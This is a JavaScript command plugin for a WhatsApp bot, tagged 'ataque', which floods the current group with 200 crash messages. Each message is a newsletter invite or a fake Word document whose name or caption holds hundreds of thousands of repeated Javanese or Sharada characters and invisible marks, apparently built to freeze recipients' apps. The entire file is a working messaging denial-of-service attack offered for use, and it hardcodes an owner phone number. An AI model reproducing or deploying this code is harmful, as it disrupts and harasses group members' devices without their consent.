import fs from 'fs';

let handler = async (m, { conn }) => {
  const ownerNumber = '66825539106@s.whatsapp.net';
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return; // No responder nada si no es owner o bot
  }

  const groupId = m.chat; // Usa el grupo actual

  const canalKillGrupo = async () => {
    const travas = 'ꦾ'.repeat(90000);
    await conn.relayMessage(groupId, {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363345778623279@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas.repeat(3),
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    }, {});
  };

  const docKillGrupo = async (i) => {
    const traba = 'ꦾ'.repeat(90000);
    const contenido = '\u200E'.repeat(5000) + i;
    await conn.sendMessage(groupId, {
      document: Buffer.from(contenido),
      fileName: `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2),
      mimetype: 'application/msword',
      caption: traba.repeat(3)
    });
  };

  const canalGato = async () => {
    const travas = '𑇂𑆵𑆴𑆿'.repeat(75000);
    await conn.relayMessage(groupId, {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363345778623279@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas.repeat(3),
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    }, {});
  };

  const docGato = async (i) => {
    const traba = '𑇂𑆵𑆴𑆿'.repeat(30000);
    const contenido = '\u200E'.repeat(5000) + i;
    await conn.sendMessage(groupId, {
      document: Buffer.from(contenido),
      fileName: `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2),
      mimetype: 'application/msword',
      caption: traba.repeat(3)
    });
  };

  const delayMs = 9000; // 9 segundos entre cada ciclo
  const total = 200;
  const ciclos = Math.floor(total / 4);

  for (let i = 0; i < ciclos; i++) {
    await canalKillGrupo();
    await new Promise(r => setTimeout(r, delayMs));

    await docKillGrupo(i);
    await new Promise(r => setTimeout(r, delayMs));

    await canalGato();
    await new Promise(r => setTimeout(r, delayMs));

    await docGato(i);
    await new Promise(r => setTimeout(r, delayMs));
  }

  const restantes = total % 4;
  const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato];
  for (let i = 0; i < restantes; i++) {
    await extra[i](i);
    await new Promise(r => setTimeout(r, delayMs));
  }

  await conn.reply(m.chat, `✅ 200 mensajes enviados al grupo.`, m);
};

handler.help = ['tori'];
handler.tags = ['ataque', 'grupo'];
handler.command = ['tori616'];

export default handler;
